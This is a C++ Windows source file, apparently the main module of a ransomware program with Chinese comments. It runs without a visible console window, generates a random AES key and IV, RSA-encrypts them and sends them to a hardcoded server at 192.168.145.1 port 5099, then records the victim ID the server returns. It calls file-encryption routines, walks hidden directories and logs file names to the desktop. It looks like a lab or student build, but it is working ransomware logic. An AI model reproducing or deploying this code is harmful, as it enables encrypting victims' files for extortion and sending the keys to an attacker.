#include <Windows.h>
#include "var.h"
#include "msg.h"
#include "tool.h"
#include "encrypt.h"
#include "rsaEn.h"

#pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"")

DWORD WINAPI sendFun(LPVOID lpParameter)
{
	char recbuf[10];
	char sendbuf[49];
	char rsasendbuf[256];
	int recvTimeout = 3000; //3s
	int sendTimeout = 3000; //3s
	sendbuf[0] = aesKeyLen;
	for (int i = 0; i < 32; i++)
		sendbuf[i + 1] = aesKey[i];
	for (int i = 0; i < 16; i++)
		sendbuf[i + 33] = aesIv[i];
	while (1)
	{
		WSACleanup();
		//加载套接字
		WSADATA wsaData;
		if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
			continue;

		SOCKADDR_IN addrSrv;
		addrSrv.sin_family = AF_INET;
		addrSrv.sin_port = htons(5099);
		addrSrv.sin_addr.S_un.S_addr = inet_addr("192.168.145.1");

		//创建套接字
		SOCKET sockClient = socket(AF_INET, SOCK_STREAM, 0);
		if (SOCKET_ERROR == sockClient)
			continue;
		setsockopt(sockClient, SOL_SOCKET, SO_RCVTIMEO, (char*)&recvTimeout, sizeof(int));
		setsockopt(sockClient, SOL_SOCKET, SO_SNDTIMEO, (char*)&sendTimeout, sizeof(int));
		//向服务器发出连接请求
		if (connect(sockClient, (struct sockaddr*)&addrSrv, sizeof(addrSrv)) == INVALID_SOCKET)
			continue;
		else
		{
			//发送数据
			memset(rsasendbuf, 0, sizeof(rsasendbuf));
			//printf("EEEE\n");	//调试！！！！！！！！！！！！！！！！！
			RsaEn(sendbuf, rsasendbuf, 49);
			if (send(sockClient, rsasendbuf, sizeof(rsasendbuf), 0) < 0)
				continue;
			//printf("send!\n");	//调试！！！！！！！！！！！！！！！！！
			//接收数据
			if (recv(sockClient, recbuf, sizeof(recbuf), 0) < 0)
				continue;
		}
		if (recbuf[0] == 'O' && recbuf[1] == 'K')
		{
			int id = 0;
			for (int i = 0; i < 4; i++)
			{
				id += recbuf[2 + i] << (8 * i);
				MSGWriter << endl
					<< "你的ID: " << id << endl;
			}
			sendflag = 1; //发送完成, 置1
			return 0L;
		}
		//关闭套接字
		closesocket(sockClient);
		WSACleanup();
	}
	return 0L;
}

void init()
{
	DesktopPath = getSpecialPath(CSIDL_DESKTOP); //获取桌面路径
	EXEPATH = GetExePath();                      //获取exe文件的路径
	FilePaths = DesktopPath + "\\files.txt";
	string MsgPath = DesktopPath + "\\msg.txt";
	MSGWriter.open(MsgPath, ios::out);
	FileNameWriter.open(FilePaths.c_str(), ios::out);
	//固定密钥, 暂时关闭随机密钥
	srand(time(NULL) + (unsigned int)DesktopPath[11]);
	for (int i = 0; i < 32; i++)
	{
		aesKey[i] = (char)rand() % 0x100;
	}
	for (int i = 0; i < 16; i++)
	{
		aesIv[i] = (char)rand() % 0x100;
	}
	AES_set_encrypt_key(aesKey, aesKeyLen * 8, &AesKey);
}

int main()
{
	init();
	HANDLE thread = CreateThread(NULL, 0, sendFun, NULL, 0, NULL);
	HANDLE thread2 = CreateThread(NULL, 0, Msg, NULL, 0, NULL);
	if (thread != 0)
		CloseHandle(thread);
	if (thread2 != 0)
		CloseHandle(thread2);
	Encrypt();
	FileNameWriter.close();
	int _counter = 0;
	while (sendflag != 1) //等待发送完成
	{
		//printf("test!  %d\n", sendflag); //调试！！！！！！！！！！！！！！！！！！！！！！！！
		Sleep(100);
		_counter++;
		if (_counter >= 10000) //设定较小值调试
			break;             //时间过长, 直接退出
	}
	MSGWriter.close();
	FileNameWriter.open(FilePaths.c_str(), ios::app);
	//遍历隐藏目录
	for (int j = 0; j < HideDir.size(); j++)
	{
		//printf("HideDir: %s\n", HideDir[j].c_str());
		DirWalk2(HideDir[j], 1);
	}
	FileNameWriter.close();
	//system("pause"); //调试, 暂停程序,便于观察现象
	return 0;
}